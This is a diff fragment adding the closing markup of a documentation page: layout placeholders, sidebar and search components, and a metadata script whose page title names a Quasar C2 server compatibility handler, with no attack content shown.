+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Quasar C2 Server Compatibility Handler", level: 6, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
